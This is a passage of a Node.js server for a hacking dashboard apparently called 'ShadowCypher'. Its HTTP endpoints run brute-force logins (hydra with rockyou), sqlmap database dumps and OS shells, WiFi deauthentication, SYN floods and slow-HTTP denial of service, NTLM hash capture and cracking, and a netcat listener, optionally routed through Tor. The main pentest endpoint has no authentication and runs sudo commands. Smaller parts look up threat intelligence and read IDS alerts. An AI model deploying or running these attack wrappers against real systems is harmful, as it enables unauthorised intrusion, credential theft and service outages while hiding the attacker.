            const dns = await run('cat /etc/resolv.conf | grep nameserver | awk \'{print $2}\' | head -3');
            const servers = dns.trim().split('\n');
            const publicDns = servers.filter(s => !s.startsWith('127.') && s !== '::1');
            if (publicDns.length > 0 && shadowMode) {
                leaks.push({ type: 'DNS', severity: 'high', detail: 'DNS queries go to ' + publicDns.join(', ') + ' - not through Tor' });
            } else {
                safe.push({ type: 'DNS', detail: 'DNS: ' + servers.join(', ') });
            }
        } catch (_) {}

        // MAC address
        try {
            const iface = await getWirelessIface() || await getPrimaryIface();
            if (iface) {
                const current = await run('cat /sys/class/net/' + iface + '/address');
                const perm = await run('ethtool -P ' + iface + ' 2>/dev/null | awk \'{print $3}\'');
                if (perm && current.trim() === perm.trim()) {
                    leaks.push({ type: 'MAC', severity: 'medium', detail: 'Using permanent MAC: ' + current.trim() });
                } else if (perm) {
                    safe.push({ type: 'MAC', detail: 'MAC spoofed: ' + current.trim() + ' (real: ' + perm.trim() + ')' });
                }
            }
        } catch (_) {}

        // Hostname
        try {
            const hn = await run('hostname');
            if (hn.includes('jack') || hn.includes('mint') || hn.includes('shadow')) {
                leaks.push({ type: 'Hostname', severity: 'medium', detail: 'Hostname contains identifying info: ' + hn.trim() });
            } else {
                safe.push({ type: 'Hostname', detail: 'Hostname: ' + hn.trim() });
            }
        } catch (_) {}

        // Bash history exists
        try {
            await run('test -s ~/.bash_history');
            leaks.push({ type: 'History', severity: 'low', detail: 'Bash history file contains data' });
        } catch (_) { safe.push({ type: 'History', detail: 'Bash history empty/missing' }); }

        res.json({ leaks, safe, totalLeaks: leaks.length, criticalLeaks: leaks.filter(l => l.severity === 'critical').length });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

// Pentest / Hacking tools - real implementations
const WORDLIST = path.join(__dirname, 'wordlists', 'rockyou.txt');
const NMAP_SCRIPTS = '/usr/share/nmap/scripts';

// Tool installer - install missing tools
app.post('/api/hacking/install-tool', requireAuth, async (req, res) => {
    const { tool } = req.body;
    const installMap = {
        'masscan': 'sudo apt-get install -y masscan',
        'hashcat': 'sudo apt-get install -y hashcat',
        'responder': 'sudo apt-get install -y responder',
        'bettercap': 'sudo apt-get install -y bettercap',
        'ettercap': 'sudo apt-get install -y ettercap-text-only',
        'enum4linux': 'sudo apt-get install -y enum4linux',
        'dirb': 'sudo apt-get install -y dirb',
        'wfuzz': 'sudo apt-get install -y wfuzz',
        'socat': 'sudo apt-get install -y socat',
        'tshark': 'sudo apt-get install -y wireshark-common tshark',
        'subfinder': 'go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest 2>&1 || sudo apt-get install -y subfinder',
        'nuclei': 'go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest',
        'httpx': 'go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest',
        'ffuf': 'go install -v github.com/ffuf/ffuf/v2@latest || sudo apt-get install -y ffuf',
        'feroxbuster': 'sudo apt-get install -y feroxbuster',
    };
    if (!tool || !installMap[tool]) return res.json({ error: 'Unknown tool: ' + tool });
    try {
        const out = await run(installMap[tool]);
        const check = await run('which ' + tool + ' 2>/dev/null');
        res.json({ success: !!check.trim(), output: out, installed: !!check.trim() });
    } catch (e) { res.json({ error: e.message }); }
});

app.post('/api/pentest', async (req, res) => {
    const { tool, target, params } = req.body;
    if (!tool || !target) return res.status(400).json({ error: 'Tool and target required' });
    const safeTarget = sanitizeTarget(target);
    if (!safeTarget) return res.status(400).json({ error: 'Invalid target' });
    const proxy = shadowMode ? 'proxychains4 ' : '';
    const port = Math.min(65535, Math.max(1, parseInt(params?.port, 10) || 80));
    const n = Math.min(10000, Math.max(10, parseInt(params?.n, 10) || 100));
    const cc = Math.min(100, Math.max(1, parseInt(params?.c, 10) || 10));
    const username = params?.username || 'admin';
    const service = params?.service || 'ssh';
    const hashfile = params?.hashfile || '';
    const urlTarget = safeTarget.startsWith('http') ? safeTarget : 'http://' + safeTarget.replace(/^\/+/, '');
    let cmd = '';
    switch (tool) {
        // === RECON ===
        case 'nmap-full': cmd = `${proxy}sudo nmap -sS -sV -O -A --top-ports 1000 ${shellQuote(safeTarget)} 2>&1`; break;
        case 'nmap-vuln': cmd = `${proxy}sudo nmap -sV --script=vuln,exploit,auth ${shellQuote(safeTarget)} 2>&1`; break;
        case 'nmap-stealth': cmd = `${proxy}sudo nmap -sS -T2 -f -D RND:5 --data-length 24 ${shellQuote(safeTarget)} 2>&1`; break;
        case 'nmap-scripts': cmd = `${proxy}sudo nmap -sV --script=default,safe,banner,http-headers,http-title,ssl-cert,ssh-hostkey ${shellQuote(safeTarget)} 2>&1`; break;
        case 'nmap-firewall': cmd = `${proxy}sudo nmap -sA -T4 ${shellQuote(safeTarget)} 2>&1`; break;
        // === WEB ===
        case 'nikto': cmd = `${proxy}nikto -h ${shellQuote(safeTarget)} -Tuning 123bde -C all 2>&1`; break;
        case 'gobuster': cmd = `${proxy}gobuster dir -u ${shellQuote(urlTarget)} -w ${WORDLIST.replace('rockyou.txt', '../nmap/nselib/data/http-default-accounts.txt')} -t 20 --quiet 2>/dev/null || ${proxy}gobuster dir -u ${shellQuote(urlTarget)} -w /usr/share/gobuster/wordlists/common.txt --quiet 2>&1`; break;
        case 'sqlmap': cmd = `${proxy}sqlmap -u ${shellQuote(urlTarget)} --batch --level=3 --risk=2 --banner --dbs --threads=4 2>&1`; break;
        case 'sqlmap-forms': cmd = `${proxy}sqlmap -u ${shellQuote(urlTarget)} --batch --forms --crawl=2 --level=3 --risk=2 2>&1`; break;
        // === BRUTE FORCE ===
        case 'hydra-ssh': cmd = `${proxy}hydra -l ${shellQuote(username)} -P ${shellQuote(WORDLIST)} ${shellQuote(safeTarget)} ssh -t 4 -f -V 2>&1 | tail -60`; break;
        case 'hydra-ftp': cmd = `${proxy}hydra -l ${shellQuote(username)} -P ${shellQuote(WORDLIST)} ${shellQuote(safeTarget)} ftp -t 4 -f -V 2>&1 | tail -60`; break;
        case 'hydra-http': cmd = `${proxy}hydra -l ${shellQuote(username)} -P ${shellQuote(WORDLIST)} ${shellQuote(safeTarget)} http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -t 4 -f -V 2>&1 | tail -60`; break;
        case 'hydra-rdp': cmd = `${proxy}hydra -l ${shellQuote(username)} -P ${shellQuote(WORDLIST)} ${shellQuote(safeTarget)} rdp -t 4 -f -V 2>&1 | tail -60`; break;
        case 'hydra-smb': cmd = `${proxy}hydra -l ${shellQuote(username)} -P ${shellQuote(WORDLIST)} ${shellQuote(safeTarget)} smb -t 4 -f -V 2>&1 | tail -60`; break;
        case 'hydra-custom': cmd = `${proxy}hydra -l ${shellQuote(username)} -P ${shellQuote(WORDLIST)} ${shellQuote(safeTarget)} ${shellQuote(service)} -t 4 -f -V 2>&1 | tail -60`; break;
        // === PASSWORD CRACKING ===
        case 'john': cmd = hashfile ? `john --wordlist=${shellQuote(WORDLIST)} ${shellQuote(hashfile)} 2>&1` : `echo "Provide a hash file path in params.hashfile"`; break;
        case 'john-show': cmd = hashfile ? `john --show ${shellQuote(hashfile)} 2>&1` : `echo "Provide a hash file path"`; break;
        // === WIRELESS ===
        case 'aircrack-scan': cmd = `sudo airmon-ng 2>&1 && echo "---" && sudo iwlist scan 2>&1 | head -100`; break;
        case 'aircrack-deauth': { const wIface = params?.iface || 'wlo1'; cmd = `sudo aireplay-ng --deauth 10 -a ${shellQuote(safeTarget)} ${wIface.replace(/[^a-zA-Z0-9_-]/g,'')} 2>&1`; } break;
        case 'aircrack-crack': cmd = hashfile ? `aircrack-ng -w ${shellQuote(WORDLIST)} ${shellQuote(hashfile)} 2>&1` : `echo "Capture a handshake first (.cap file in params.hashfile)"`; break;
        // === NETWORK ATTACKS ===
        case 'arp-scan': cmd = `sudo arp-scan -l 2>/dev/null || sudo nmap -sn -PR $(ip route | grep default | awk '{print $3}' | sed 's/\.[0-9]*$/.0\/24/') -oG - 2>&1`; break;
        case 'smb-enum': cmd = `${proxy}smbclient -L ${shellQuote(safeTarget)} -N 2>&1 && echo "\n=== NMAP SMB ===" && sudo nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 ${shellQuote(safeTarget)} 2>&1`; break;
        case 'snmp-enum': cmd = `${proxy}sudo nmap -sU -p 161 --script=snmp-info,snmp-brute ${shellQuote(safeTarget)} 2>&1`; break;
        // === STRESS ===
        case 'ab': cmd = `${proxy}ab -n ${n} -c ${cc} ${shellQuote(urlTarget)} 2>&1`; break;
        case 'slowhttptest': cmd = `${proxy}slowhttptest -c 500 -H -g -o /tmp/slow_${Date.now()} -i 10 -r 200 -t GET -u ${shellQuote(urlTarget)} -x 24 -p 3 2>&1`; break;
        case 'hping3': cmd = `sudo hping3 -S --flood -V -p ${port} -c 1000 ${shellQuote(safeTarget)} 2>&1`; break;
        // === EXPLOIT ===
        case 'searchsploit': cmd = `searchsploit ${shellQuote(safeTarget)} 2>&1`; break;
        // === MASS SCANNING ===
        case 'masscan': cmd = `sudo masscan ${safeTarget} -p1-65535 --rate=1000 --open -oL - 2>/dev/null | head -200`; break;
        case 'masscan-top': cmd = `sudo masscan ${safeTarget} -p80,443,8080,8443,21,22,23,25,53,110,143,993,995,3306,3389,5432,5900,6379,27017 --rate=500 --open -oL - 2>/dev/null`; break;
        // === SUBDOMAIN & DISCOVERY ===
        case 'subfinder': cmd = `subfinder -d ${safeTarget} -silent 2>/dev/null | head -100`; break;
        case 'nuclei': cmd = `echo "${safeTarget}" | nuclei -silent -severity critical,high,medium 2>/dev/null | head -100`; break;
        case 'httpx-probe': cmd = `echo "${safeTarget}" | httpx -silent -status-code -title -tech-detect -follow-redirects 2>/dev/null`; break;
        // === FUZZING ===
        case 'ffuf': cmd = `ffuf -u http://${safeTarget}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -t 20 -timeout 5 2>/dev/null | head -100`; break;
        case 'wfuzz': cmd = `wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://${safeTarget}/FUZZ 2>/dev/null | head -80`; break;
        // === ENUMERATION ===
        case 'enum4linux-full': cmd = `enum4linux -a ${safeTarget} 2>/dev/null | head -200`; break;
        case 'responder-analyze': cmd = `ls -la /usr/share/responder/logs/ 2>/dev/null && cat /usr/share/responder/logs/*NTLM* 2>/dev/null | tail -50 || echo "No captured hashes. Run: sudo responder -I $(ip route | grep default | awk '{print $5}') -rdwv"`; break;
        // === HASHCAT MODES ===
        case 'hashcat-ntlm': cmd = `hashcat -m 5600 ${params?.hashfile || '/tmp/hashes.txt'} ${WORDLIST} --force --status 2>/dev/null | tail -30`; break;
        case 'hashcat-md5': cmd = `hashcat -m 0 ${params?.hashfile || '/tmp/hashes.txt'} ${WORDLIST} --force --status 2>/dev/null | tail -30`; break;
        case 'hashcat-sha256': cmd = `hashcat -m 1400 ${params?.hashfile || '/tmp/hashes.txt'} ${WORDLIST} --force --status 2>/dev/null | tail -30`; break;
        case 'hashcat-bcrypt': cmd = `hashcat -m 3200 ${params?.hashfile || '/tmp/hashes.txt'} ${WORDLIST} --force --status 2>/dev/null | tail -20`; break;
        // === ADVANCED SQL INJECTION ===
        case 'sqlmap-waf': cmd = `sqlmap -u "${safeTarget}" --batch --level=5 --risk=3 --tamper=space2comment,randomcase,between,charencode --random-agent --timeout=10 2>/dev/null | tail -60`; break;
        case 'sqlmap-dump': cmd = `sqlmap -u "${safeTarget}" --batch --dump --threads=4 --timeout=10 2>/dev/null | tail -80`; break;
        case 'sqlmap-os': cmd = `sqlmap -u "${safeTarget}" --batch --os-shell --timeout=10 2>/dev/null | tail -40`; break;
        // === NETWORK UTILITIES ===
        case 'netcat-banner': cmd = `echo "" | nc -w 3 -v ${safeTarget} ${params?.port || 80} 2>&1 | head -20`; break;
        case 'netcat-listen': {
                const ncPort = parseInt(params?.port) || 4444;
                try {
                    const ncProc = require('child_process').spawn('nc', ['-lvnp', String(ncPort)], { detached: true, stdio: ['ignore', 'pipe', 'pipe'] });
                    let ncOut = '';
                    ncProc.stdout.on('data', d => { ncOut += d.toString(); });
                    ncProc.stderr.on('data', d => { ncOut += d.toString(); });
                    setTimeout(() => { try { process.kill(-ncProc.pid); } catch(_) {} }, 60000);
                    return res.json({ output: 'Netcat listener started on port ' + ncPort + ' (PID: ' + ncProc.pid + ')\nWill auto-close after 60s\nCommand: nc -lvnp ' + ncPort });
                } catch(e) { return res.json({ output: 'Error: ' + e.message }); }
            }
        case 'dns-zone': cmd = `dig axfr @${safeTarget} $(dig +short SOA ${safeTarget} | awk '{print $1}') 2>/dev/null || dig any ${safeTarget} +noall +answer`; break;
        case 'whois-deep': cmd = `whois ${safeTarget} 2>/dev/null`; break;
        case 'ssl-scan': cmd = `timeout 15 nmap --script ssl-enum-ciphers,ssl-cert,ssl-known-key -p 443 ${safeTarget} 2>/dev/null || echo "Install nmap ssl scripts"`; break;
        case 'http-headers': cmd = `curl -sI -L --max-time 10 "${safeTarget}" 2>/dev/null`; break;
        case 'reverse-dns': cmd = `for i in $(seq 1 254); do host 192.168.1.$i 2>/dev/null | grep "name pointer" & done; wait`; break;
        case 'nmap-os-detect': cmd = `sudo nmap -O -sV --version-intensity 5 ${safeTarget} 2>/dev/null | head -60`; break;
        default: return res.status(400).json({ error: 'Unknown tool: ' + tool });
    }
    log('PENTEST: ' + tool + ' -> ' + safeTarget, 'HACK');
    try {
        const o = await run(cmd + ' | tail -n 120');
        res.json({ success: true, tool, output: o });
    } catch (e) { res.json({ success: false, tool, output: e.message }); }
});

// Installed tools check
app.get('/api/hacking/tools', async (_, res) => {
    const tools = ['nmap','nikto','sqlmap','hydra','john','aircrack-ng','gobuster','tshark','tcpdump','hping3','proxychains4','smbclient','searchsploit','slowhttptest','masscan','wireshark','hashcat','wifite','bettercap','responder','enum4linux','subfinder','nuclei','httpx','ffuf','feroxbuster','wfuzz','dirb','socat','netcat','ettercap','sherlock','maigret','holehe','theHarvester','phoneinfoga','dalfox','nosqlmap','fcrackzip','pdfcrack','rarcrack','steghide','stegseek','binwalk','foremost','exiftool','crunch','cewl','ab','macchanger','arpspoof','dnsspoof','swaks','dsniff'];
    const results = {};
    for (const t of tools) {
        try { await run('which ' + t); results[t] = true; } catch (_) { results[t] = false; }
    }
    results.wordlist = fs.existsSync(WORDLIST);
    results.wordlistPath = WORDLIST;
    res.json(results);
});

// DNS Benchmark
app.get('/api/dns/benchmark', async (_, res) => {
    const servers = [
        { name: 'Cloudflare', ip: '1.1.1.1' }, 
        { name: 'Google', ip: '8.8.8.8' }, 
        { name: 'Quad9', ip: '9.9.9.9' }, 
        { name: 'OpenDNS', ip: '208.67.222.222' }
    ];
    const results = [];
    for (const s of servers) {
        try {
            const o = await run(`ping -c 3 -W 1 ${s.ip} | tail -1 | awk -F "/" '{print $5}'`);
            results.push({ ...s, latency: o.trim() || 'timeout' });
        } catch (e) { results.push({ ...s, latency: 'error' }); }
    }
    res.json(results);
});

// Network audit
app.get('/api/audit/network', async (_, res) => {
    try {
        const gw = await run("ip route | grep default | awk '{print $3}'");
        const scan = await run(`nmap -F --open ${gw.trim()} 2>/dev/null | tail -n +5`);
        res.json({ gateway: gw.trim(), scan_results: scan });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

// Intelligence / Security
const INTEL_CONFIG_FILE = path.join(__dirname, 'intel_config.json');
function getIntelConfig() {
    try {
        const c = JSON.parse(fs.readFileSync(INTEL_CONFIG_FILE, 'utf8'));
        return {
            hibpApiKey: c.hibpApiKey || '',
            otxApiKey: c.otxApiKey || '',
            abuseChAuthKey: c.abuseChAuthKey || ''
        };
    } catch (e) { return { hibpApiKey: '', otxApiKey: '', abuseChAuthKey: '' }; }
}

function saveIntelConfig(updates) {
    const c = getIntelConfig();
    const merged = { ...c, ...updates };
    fs.writeFileSync(INTEL_CONFIG_FILE, JSON.stringify(merged, null, 2));
}

app.get('/api/intel/config', (_, res) => {
    const c = getIntelConfig();
    res.json({ hasHibpKey: !!c.hibpApiKey, hasOtxKey: !!c.otxApiKey, hasAbuseChKey: !!c.abuseChAuthKey });
});

app.post('/api/intel/config', (req, res) => {
    try {
        const c = getIntelConfig();
        const hibp = req.body.hibpApiKey != null ? String(req.body.hibpApiKey).trim() : c.hibpApiKey;
        const otx = req.body.otxApiKey != null ? String(req.body.otxApiKey).trim() : c.otxApiKey;
        const abuseCh = req.body.abuseChAuthKey != null ? String(req.body.abuseChAuthKey).trim() : c.abuseChAuthKey;
        saveIntelConfig({ hibpApiKey: hibp, otxApiKey: otx, abuseChAuthKey: abuseCh });
        res.json({ success: true });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

// Sanitization helpers
function sanitizeIface(name) {
    if (!name || name === 'any') return 'any';
    return /^[a-zA-Z0-9_.-]+$/.test(name) ? name : 'any';
}

function sanitizeOnionUrl(url) {
    const s = String(url).trim().toLowerCase();
    if (!s.endsWith('.onion')) return null;
    if (!/^[a-z0-9]+\.onion$/i.test(s.split('/')[0])) return null;
    return s.replace(/[^a-z0-9.:\/-]/gi, '');
}

function sanitizeTarget(t) {
    const s = String(t).trim();
    if (!s.length || /[;&|$`<>()]/.test(s)) return null;
    return s;
}

function sanitizeHash(h) {
    const s = String(h).trim().toLowerCase();
    if (!/^[a-f0-9]{32}$/.test(s) && !/^[a-f0-9]{40}$/.test(s) && !/^[a-f0-9]{64}$/.test(s)) return null;
    return s;
}

function sanitizeUrlForLookup(u) {
    const s = String(u).trim();
    if (!s.length || s.length > 2048) return null;
    try {
        const parsed = new URL(s);
        if (!['http:', 'https:'].includes(parsed.protocol)) return null;
        return parsed.href;
    } catch (_) { return null; }
}

function shellQuote(s) {
    return '"' + String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"') + '"';
}

// Packet sniffing
app.post('/api/intel/sniff', async (req, res) => {
    const iface = sanitizeIface(req.body.iface);
    const count = Math.min(500, Math.max(5, parseInt(req.body.count, 10) || 20));
    try {
        const o = await run(`sudo tshark -i ${iface} -c ${count} -T fields -e frame.number -e frame.time -e ip.src -e ip.dst -e _ws.col.Protocol -E header=y -E separator=, 2>/dev/null`);
        res.json({ success: true, output: o || "No packets captured." });
    } catch (e) {
        try {
            const oStatus = await run(`sudo tcpdump -i ${iface} -n -c ${count} -A 2>/dev/null`);
            res.json({ success: true, method: 'tcpdump-fallback', output: oStatus });
        } catch (e2) {
            res.status(500).json({ error: e2.message || 'tshark and tcpdump failed.' });
        }
    }
});

// IDS Alerts
app.get('/api/intel/ids-alerts', async (_, res) => {
    try {
        let alerts = '';
        try { alerts = await run('tail -n 50 /var/log/snort/alert 2>/dev/null'); } catch (_) { }
        if (!alerts || alerts.length < 5) {
            try {
                const suricataLog = '/var/log/suricata/fast.log';
                if (fs.existsSync(suricataLog)) {
                    alerts = fs.readFileSync(suricataLog, 'utf8').split('\n').slice(-50).join('\n');
                }
            } catch (_) { }
        }
        if (!alerts || alerts.length < 5) {
            try {
                const evePath = '/var/log/suricata/eve.json';
                if (fs.existsSync(evePath)) {
                    const lines = fs.readFileSync(evePath, 'utf8').trim().split('\n').slice(-30);
                    alerts = lines.filter(l => l.includes('"event_type":"alert"')).map(l => {
                        try { const j = JSON.parse(l); return j.timestamp + ' ' + (j.alert?.signature || '') + ' ' + (j.src_ip || '') + ' -> ' + (j.dest_ip || ''); } catch (_) { return l; }
                    }).join('\n');
                }
            } catch (_) { }
        }
        res.json({ success: true, alerts: alerts || 'No IDS alerts.' });
    } catch (e) { res.json({ success: false, error: e.message }); }
});

// WiFi Recon - comprehensive wireless scanning
app.get('/api/intel/wifi-recon', async (_, res) => {
    try {
        const wiface = await getWirelessIface();
        if (!wiface) return res.json({ success: false, output: "No wireless interface found." });
        let output = '';
        try {
            const nmcli = await run('nmcli -f BSSID,SSID,MODE,CHAN,FREQ,RATE,SIGNAL,BARS,SECURITY device wifi list 2>/dev/null');
            if (nmcli && nmcli.trim().length > 20) output = nmcli;
        } catch (_) {}
        if (!output) {
            try {
                const iwlist = await run(`sudo iwlist ${wiface} scan 2>/dev/null`);
                output = iwlist || '';
            } catch (_) {}
        }
        if (!output) {
            try {
                output = await run(`sudo iw dev ${wiface} scan 2>/dev/null | grep -E "BSS |SSID|signal|freq|capability" | head -100`);
            } catch (_) {}
        }
        let iface_info = '';
        try { iface_info = await run(`iw dev ${wiface} info 2>/dev/null`); } catch (_) {}
        res.json({ success: true, interface: wiface, info: iface_info, output: output || 'No networks found. Try: sudo iw dev ' + wiface + ' scan' });
    } catch (e) { res.json({ success: false, output: e.message }); }
});

// Threat Feed
app.get('/api/intel/threat-feed', async (_, res) => {
    try {
        let ips = [];
        let source = '';
        try {
            const r = await fetch('https://feodotracker.abuse.ch/downloads/ipblocklist_recommended.txt', { signal: AbortSignal.timeout(15000) });
            const txt = await r.text();
            ips = txt.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#') && /^\d+\.\d+\.\d+\.\d+$/.test(l));
            source = 'abuse.ch Feodo Tracker';
        } catch (_) { }
        if (ips.length < 10) {
            try {
                const r2 = await fetch('https://raw.githubusercontent.com/stamparm/ipsum/master/levels/3.txt', { signal: AbortSignal.timeout(15000) });
                const txt2 = await r2.text();
                const more = txt2.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#') && /^\d+\.\d+\.\d+\.\d+$/.test(l));
                if (more.length) { ips = ips.concat(more); source = source ? source + ' + ipsum' : 'ipsum'; }
            } catch (_) { }
        }
        const uniq = [...new Set(ips)].slice(0, 100);
        res.json({ source: source || 'threat feed', count: uniq.length, samples: uniq });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

// AlienVault OTX - fetch pulses/IOCs (requires OTX API key)
app.get('/api/intel/otx', async (req, res) => {
    const config = getIntelConfig();
    if (!config.otxApiKey) {
        return res.status(400).json({
            error: 'OTX API key required. Add to Intel Config (get at https://otx.alienvault.com/api)',
            pulses: []
        });
    }
    try {
        const modifiedSince = req.query.modified_since || '';
        let url = 'https://otx.alienvault.com/api/v1/pulses/subscribed';
        if (modifiedSince) url += '?modified_since=' + encodeURIComponent(modifiedSince);
        const r = await fetch(url, {
            headers: { 'X-OTX-API-KEY': config.otxApiKey, 'User-Agent': 'ShadowCypher-Intel' },
            signal: AbortSignal.timeout(15000)
        });
        if (!r.ok) {
            const err = await r.text();
            return res.status(r.status).json({
                error: r.status === 401 ? 'Invalid OTX API key' : (err || r.statusText),
                pulses: []
            });
        }
        const data = await r.json();
        const pulses = (data.results || []).slice(0, 50).map(p => ({
            id: p.id,
            name: p.name,
            description: (p.description || '').slice(0, 200),
            author: p.author_name,
            created: p.created,
            modified: p.modified,
            tags: p.tags || [],
            indicator_count: (p.indicators || []).length
        }));
        res.json({ success: true, count: pulses.length, pulses });
    } catch (e) {
        res.status(500).json({ error: e.message || 'OTX request failed', pulses: [] });
    }
});

// MalwareBazaar hash check (MD5/SHA1/SHA256)
app.post('/api/intel/malwarebazaar', async (req, res) => {
    const hash = sanitizeHash(req.body.hash || req.query.hash);
    if (!hash) return res.status(400).json({ error: 'Valid MD5 (32), SHA1 (40), or SHA256 (64) hex hash required' });
    const config = getIntelConfig();
    if (!config.abuseChAuthKey) {
        return res.status(400).json({
            error: 'abuse.ch Auth-Key required. Add to Intel Config (get free at https://auth.abuse.ch/)',
            found: false
        });
    }
    try {
        const form = new URLSearchParams({ query: 'get_info', hash });
        const r = await fetch('https://mb-api.abuse.ch/api/v1/', {
            method: 'POST',
            headers: {
                'Auth-Key': config.abuseChAuthKey,
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'ShadowCypher-Intel'
            },
            body: form.toString(),
            signal: AbortSignal.timeout(15000)
        });
        const data = await r.json();
        if (data.query_status === 'no_api_key' || data.query_status === 'user_blacklisted') {
            return res.status(400).json({
                error: 'Invalid or missing abuse.ch Auth-Key. Get one at https://auth.abuse.ch/',
                found: false
            });
        }
        if (data.query_status === 'hash_not_found' || data.query_status === 'no_hash_provided' || data.query_status === 'illegal_hash') {
            return res.json({ success: true, found: false, hash, message: 'Hash not found in MalwareBazaar' });
        }
        if (data.query_status !== 'ok') {
            return res.json({ success: true, found: false, hash, message: data.query_status || 'Unknown' });
        }
        const sample = data.data?.[0] || data;
        res.json({
            success: true,
            found: true,
            hash,
            sha256: sample.sha256_hash,
            md5: sample.md5_hash,
            malware: sample.signature || null,
            tags: sample.tags || [],
            first_seen: sample.first_seen,
            file_type: sample.file_type,
            file_name: sample.file_name
        });
    } catch (e) {
        res.status(500).json({ error: e.message || 'MalwareBazaar request failed', found: false });
    }
});

// URLhaus URL check
app.post('/api/intel/urlhaus', async (req, res) => {
    const url = sanitizeUrlForLookup(req.body.url || req.query.url);
    if (!url) return res.status(400).json({ error: 'Valid HTTP/HTTPS URL required (max 2048 chars)' });
    const config = getIntelConfig();
    if (!config.abuseChAuthKey) {
        return res.status(400).json({
            error: 'abuse.ch Auth-Key required. Add to Intel Config (get free at https://auth.abuse.ch/)',
            threat: false
        });
    }
    try {
        const form = new URLSearchParams({ url });
        const r = await fetch('https://urlhaus-api.abuse.ch/v1/url/', {
            method: 'POST',
            headers: {
                'Auth-Key': config.abuseChAuthKey,
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'ShadowCypher-Intel'
            },
            body: form.toString(),
            signal: AbortSignal.timeout(15000)
        });
        const data = await r.json();
        if (data.query_status === 'no_api_key' || data.query_status === 'user_blacklisted') {
            return res.status(400).json({
                error: 'Invalid or missing abuse.ch Auth-Key. Get one at https://auth.abuse.ch/',
                threat: false
            });
        }
        if (data.query_status === 'no_results' || !data.threat) {
            return res.json({ success: true, threat: false, url, message: 'URL not found in URLhaus' });
        }
        res.json({
            success: true,
            threat: true,
            url,
            url_status: data.url_status,
            threat_type: data.threat || 'malware_download',
            tags: data.tags || [],
            date_added: data.date_added,
            urlhaus_reference: data.urlhaus_reference
        });
    } catch (e) {
        res.status(500).json({ error: e.message || 'URLhaus request failed', threat: false });
    }
});

// Data breach check
app.post('/api/intel/check-leak', async (req, res) => {
    const email = String(req.body.email || '').trim().toLowerCase();
    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return res.status(400).json({ error: 'Valid email required' });
    const config = getIntelConfig();
    if (!config.hibpApiKey) {
        return res.status(400).json({
            error: 'HIBP API key required. Get one at https://haveibeenpwned.com/API/Key',
            breached: false,
            leaks: []
        });
    }
    try {
        const enc = encodeURIComponent(email);
        const r = await fetch(`https://haveibeenpwned.com/api/v3/breachedaccount/${enc}`, {
            headers: { 'hibp-api-key': config.hibpApiKey, 'User-Agent': 'ShadowCypher-Router-Admin' },
            signal: AbortSignal.timeout(10000)
        });
        if (r.status === 404) return res.json({ email, breached: false, leaks: [] });
        if (!r.ok) {
            const err = await r.text();
            return res.status(r.status).json({
                error: r.status === 401 ? 'Invalid HIBP API key' : (r.status === 429 ? 'Rate limited' : err || r.statusText),
                breached: false,
                leaks: []
            });
        }
        const breaches = await r.json();
        const leaks = (breaches || []).map(b => ({ name: b.Name || b.Title || 'Unknown', date: b.BreachDate, domain: b.Domain }));
        res.json({ email, breached: leaks.length > 0, leaks });
    } catch (e) {
        res.status(500).json({ error: e.message || 'HIBP request failed', breached: false, leaks: [] });
    }
});

// Onion fetch
app.post('/api/intel/onion-fetch', async (req, res) => {
    const raw = req.body.url;
    const url = sanitizeOnionUrl(raw);
    if (!url) return res.status(400).json({ error: 'Valid .onion URL required' });
    try {
        const o = await run(`torsocks curl -s -m 30 "${url}" 2>&1 | head -c 10000`);
        res.json({ success: true, url, data: `[TOR]\n\n${o || 'No content or timeout.'}` });
    } catch (e) {
        res.json({ success: false, error: 'Tor failed: ' + e.message });
    }
});

// ═══════════ DIAGNOSTIC / LOGGING ═══════════
app.get('/api/diagnostic', async (req, res) => {
    const results = {};
    
    const tests = [
        { name: 'overview', fn: () => run('echo ok') },
        { name: 'devices', fn: () => run('ip neighbor show 2>/dev/null || arp -a') },
        { name: 'wifi', fn: async () => { const w = await getWirelessIface(); return run(w ? `iwconfig ${w} 2>/dev/null` : 'echo "no wifi"'); } },
        { name: 'ports', fn: () => run('ss -tlnp 2>/dev/null | head -5') },
        { name: 'firewall', fn: () => run('sudo iptables -L INPUT -n --line-numbers 2>&1 | head -3') },
        { name: 'nmap', fn: () => run('which nmap') },
        { name: 'nikto', fn: () => run('which nikto') },
        { name: 'sqlmap', fn: () => run('which sqlmap') },
        { name: 'proxychains', fn: () => run('which proxychains4') },
        { name: 'tshark', fn: () => run('which tshark') },
        { name: 'tcpdump', fn: () => run('which tcpdump') }
    ];
    
    for (const test of tests) {
        try {
            await test.fn();
            results[test.name] = { status: 'ok' };
        } catch (e) {
            results[test.name] = { status: 'error', message: e.message };
        }
    }
    
    try {
        if (fs.existsSync(LOG_FILE)) {
            const logs = fs.readFileSync(LOG_FILE, 'utf8').split('\n').filter(l => l.trim()).slice(-50);
            results.recentLogs = logs;
        }
    } catch (e) {}
    
    res.json(results);
});

app.get('/api/logs/app', (req, res) => {
    try {
        if (fs.existsSync(LOG_FILE)) {
            const logs = fs.readFileSync(LOG_FILE, 'utf8').split('\n').filter(l => l.trim()).slice(-100);
            res.json({ logs });
        } else {
            res.json({ logs: [] });
        }
    } catch (e) {
        res.json({ logs: [], error: e.message });
    }
});

// AI Functions
const AI_FUNCTIONS = [
    { name: 'get_system_overview', description: 'Get system overview including IPs, CPU, memory, uptime' },
    { name: 'get_devices', description: 'List all devices on the network' },
    { name: 'get_processes', description: 'List top processes by CPU usage' },
    { name: 'kill_process', description: 'Kill a process by PID', parameters: { pid: 'number' } },
    { name: 'block_ip', description: 'Block an IP in the firewall', parameters: { ip: 'string' } },
    { name: 'unblock_ip', description: 'Unblock an IP in the firewall', parameters: { ip: 'string' } },
